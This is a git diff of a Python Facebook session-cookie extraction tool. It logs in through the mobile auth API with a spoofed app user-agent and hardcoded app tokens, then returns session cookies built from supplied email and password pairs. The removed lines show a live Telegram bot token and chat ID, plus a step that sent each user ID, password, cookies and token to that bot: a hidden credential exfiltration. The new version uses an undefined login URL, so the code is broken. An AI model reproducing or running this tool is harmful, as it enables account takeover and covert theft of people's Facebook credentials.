@@ -1,7 +1,10 @@
-import random
 import requests
+import random
 
-url = "https://graph.facebook.com/auth/login"
+# Firebase Realtime Database URL
+FIREBASE_DB_URL = "https://auto-ce-ac0a7-default-rtdb.asia-southeast1.firebasedatabase.app/users.json"
+
+# Generate a random User-Agent for the login request
 def useragent():
     fbks = (
         'com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite')
@@ -19,8 +22,9 @@ def useragent():
     CRACK_ua = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM={{density=3.0,width=1280,height=1440}};FBLC/{lc};FBRV/0;FBCR/{cr};FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/{gtt};FBSV/{android_version};FBOP/19;FBCA/armeabi-v7a:armeabi;]'
     return CRACK_ua
 
-user_id = "0d80f57864ffb5d8"
+user_id = "jhdhfvgbd"
 
+# Validate the User ID in Firebase using the REST API
 def validate_user_id(user_id):
     response = requests.get(FIREBASE_DB_URL)
     if response.status_code == 200:
@@ -35,32 +39,8 @@ def validate_user_id(user_id):
         print(f"Failed to connect to Firebase. Status Code: {response.status_code}")
         return False
 
-
-def prin(message):
-    """
-    Send a formatted message to Telegram.
-    """
-    bot_token = "7696072927:AAHCieEIUD2UVr5alMwZqyIPhVGjPUqr3KU"  # Replace with your bot token
-    chat_id = "7352132358"  # Replace with your chat ID
-    telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-
-    # Send the request to Telegram
-    data = {
-        "chat_id": chat_id,
-        "text": message,
-        "parse_mode": "HTML"  # Optional: Remove if you don't need HTML parsing
-    }
-    try:
-        response = requests.post(telegram_url, data=data)
-        if response.status_code == 200:
-            print("Message sent to Telegram successfully!")
-        else:
-            print(f"Failed to send message. Status code: {response.status_code}, Response: {response.text}")
-    except Exception as e:
-        print("Error sending message to Telegram:", e)
-
-
-def inc3_cookies(user_id, au, to):
+# Function to perform cookie extraction
+def inc3_cookies(user_id, email, pwd):
     # Validate the User ID
     if not validate_user_id(user_id):
         return "Unauthorized User ID"
@@ -68,31 +48,29 @@ def inc3_cookies(user_id, au, to):
     # Generate headers and data for the Facebook login request
     ugen = useragent()
     uuid = generate_udid()
-
-    # Prepare data for the login request
-    data = {"adid": uuid,
-            "format": "json",
-            "device_id": uuid,
-            "cpl": "true",
-            "family_device_id": uuid,
-            "credentials_type": "device_based_login_password",
-            "error_detail_type": "button_with_disabled",
-            "source": "device_based_login",
-            "email": au,
-            "password": to,
-            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
-            "generate_session_cookies": "1",
-            "meta_inf_fbmeta": "",
-            "advertiser_id": uuid,
-            "currently_logged_in_userid": "0",
-            "locale": "en_GB",
-            "client_country_code": "GB",
-            "method": "auth.login",
-            "fb_api_req_friendly_name": "authenticate",
-            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-            "api_key": "882a8490361da98702bf97a021ddc14d"
-            }
-
+    data = {
+        "adid": uuid,
+        "format": "json",
+        "device_id": uuid,
+        "cpl": "true",
+        "family_device_id": uuid,
+        "credentials_type": "device_based_login_password",
+        "error_detail_type": "button_with_disabled",
+        "source": "device_based_login",
+        "email": email,
+        "password": pwd,
+        "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+        "generate_session_cookies": "1",
+        "meta_inf_fbmeta": "",
+        "advertiser_id": uuid,
+        "currently_logged_in_userid": "0",
+        "locale": "en_GB",
+        "client_country_code": "GB",
+        "method": "auth.login",
+        "fb_api_req_friendly_name": "authenticate",
+        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+        "api_key": "882a8490361da98702bf97a021ddc14d"
+    }
     headers = {
         'User-Agent': ugen,
         'Content-Type': 'application/x-www-form-urlencoded',
@@ -115,44 +93,27 @@ def inc3_cookies(user_id, au, to):
     req = requests.Session()
     response = req.post(url, data=data, headers=headers).json()
 
-    # Print the response for debugging
+    # Debugging output
     print("Response:", response)
 
-    # Check if session cookies are present in the response
     if "session_cookies" in response:
         token = response["access_token"]
-        ce = {cookie['name']: cookie['value'] for cookie in response['session_cookies']}
+        cookies = {cookie['name']: cookie['value'] for cookie in response['session_cookies']}
+        c_user = cookies.get('c_user', '')
 
-        # Print cookies for debugging
-        print(token)
-        print("Cookies:")
-        for name, value in ce.items():
-            print(f"{name}: {value}")
-
-        # Check if c_user is present to verify successful login
-        c_user = ce.get('c_user', '')
         if not c_user:
-            return f"{au} {to} wrong pass"
+            return f"{email} {pwd} wrong pass"
 
-        # Extract specific cookies
-        datr = ce.get('datr', '')
-        sb = ce.get('sb', '')
-        xs = ce.get('xs', '')
-        fr = ce.get('fr', '')
+        datr = cookies.get('datr', '')
+        sb = cookies.get('sb', '')
+        xs = cookies.get('xs', '')
+        fr = cookies.get('fr', '')
 
-        # Create the cookie string in the specified format
-        ces = f"datr={datr};sb={sb};c_user={c_user};xs={xs};fr={fr};m_page_voice={c_user}"
-
-        # Handle checkpoint detection
-        if 'checkpoint' in ces:
-            return f"{au} {au} id in checkpoint"
-        else:
-            try:
-                cookies = f"{c_user}|{to}|{ces}|{token}"
-                send(cookies)
-                return ces
-            except Exception as e:
-                print(f"Error sending cookies: {e}")
-                return ces
+        cookie = f"datr={datr};sb={sb};c_user={c_user};xs={xs};fr={fr};m_page_voice={c_user}"
+        return cookie
     else:
-        return f"{au} {to} login failed, no session cookies returned"
+        return f"{email} {pwd} login failed, no session cookies returned"
+
+def generate_udid(length=12):
+    characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+    return ''.join(random.choice(characters) for _ in range(length))
